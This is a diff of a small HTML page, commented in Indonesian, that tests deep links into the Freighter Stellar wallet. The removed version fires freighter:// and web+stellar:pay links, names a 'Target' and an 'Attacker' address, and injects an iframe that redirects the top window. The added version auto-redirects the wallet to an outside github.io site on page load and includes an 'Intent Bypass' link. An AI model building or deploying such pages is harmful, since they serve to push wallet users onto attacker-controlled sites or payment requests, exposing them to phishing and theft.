@@ -2,80 +2,29 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Deep Link Test - Freighter</title>
-<style>
-body{background:#fff;color:#000;font-family:Arial;padding:20px;margin:0}
-h2{text-align:center}
-button{width:100%;padding:14px;margin:8px 0;font-size:14px;font-weight:bold;border:1px solid #000;background:#fff;cursor:pointer}
-small{color:#666;display:block;text-align:center;margin-top:20px;word-break:break-all}
-#log{margin-top:15px;font-size:12px;white-space:pre-wrap;border:1px dashed #000;padding:10px}
-</style>
+<meta http-equiv="refresh" content="2;url=freighter://dapp?url=https://0x403for.github.io">
 </head>
-<body>
-<h2>Freighter Deep Link Test</h2>
+<body style="text-align:center;padding-top:50px;font-family:Arial">
+<h3>Testing Auto Deeplink...</h3>
+<p>Jika Freighter tidak terbuka dalam 2 detik, tap di bawah:</p>
+<a href="intent://0x403for.github.io#Intent;scheme=https;package=org.freighter;S.browser_fallback_url=https://0x403for.github.io;end" 
+   style="display:block;padding:15px;background:#000;color:#fff;text-decoration:none;margin:20px">
+   TAP - Intent Bypass
+</a>
 
-<button onclick="test('freighter://dapp?url=https://0x403for.github.io')">
-1. freighter://dapp?url=
-</button>
-
-<button onclick="test('freighter://browser?url=https://0x403for.github.io')">
-2. freighter://browser?url=
-</button>
-
-<button onclick="test('freighter://open?url=https://0x403for.github.io')">
-3. freighter://open?url=
-</button>
-
-<button onclick="test('stellar://0x403for.github.io')">
-4. stellar:// domain
-</button>
-
-<button onclick="test('web+stellar:pay?destination=GBKIAL4UCC5YHFDNPHG3SMVLO4XZEEQA4VQ6F7EZW5ZDIWS324NUC537')">
-5. web+stellar:pay (GBKIAL...)
-</button>
-
-<button onclick="test('https://freighter.app/dapp/https://0x403for.github.io')">
-6. https://freighter.app/dapp/
-</button>
-
-<button onclick="iframeTest()">
-7. Iframe Test (auto open)
-</button>
-
-<div id="log">Log: Ready - buka page ini dari Chrome, bukan dari Freighter</div>
-<small>Target: GBKIAL4UCC5YHFDNPHG3SMVLO4XZEEQA4VQ6F7EZW5ZDIWS324NUC537<br>
-Attacker: GDAITTQ3FTE6BB5OBNBC7NOEAIODMVOB23EBJLVPHUVSAELIRSER3V22</small>
+<a href="https://freighter.app/" style="display:block;padding:15px;border:1px solid #000;margin:20px;text-decoration:none;color:#000">
+   TAP - Universal Link
+</a>
 
 <script>
-function test(url){
-  document.getElementById('log').innerText = "Trying: " + url + "\n" + new Date().toISOString();
-  // Method 1: window.location
-  window.location.href = url;
-  
-  // Method 2: backup via hidden iframe (bypass popup blocker)
-  setTimeout(()=>{
-    var ifr = document.createElement('iframe');
-    ifr.style.display='none';
-    ifr.src = url;
-    document.body.appendChild(ifr);
-  }, 500);
-}
+// 3 method sekaligus
+setTimeout(()=>{
+  window.location = "freighter://dapp?url=https://0x403for.github.io";
+}, 100);
 
-function iframeTest(){
-  document.getElementById('log').innerText = "Iframe injection test...";
-  // Ini yang sering lolos di dApp browser
-  var html = `<a href="https://0x403for.github.io">Click Me - aqua.network</a>
-              <script>window.top.location='https://0x403for.github.io'<\/script>`;
-  var ifr = document.createElement('iframe');
-  ifr.srcdoc = html;
-  ifr.style.width='100%';
-  ifr.style.height='200px';
-  document.body.appendChild(ifr);
-}
-
-// Auto log userAgent
-document.getElementById('log').innerText += "\nUA: " + navigator.userAgent.slice(0,80);
+setTimeout(()=>{
+  window.open("https://0x403for.github.io", "_blank");
+}, 1500);
 </script>
 </body>
 </html>
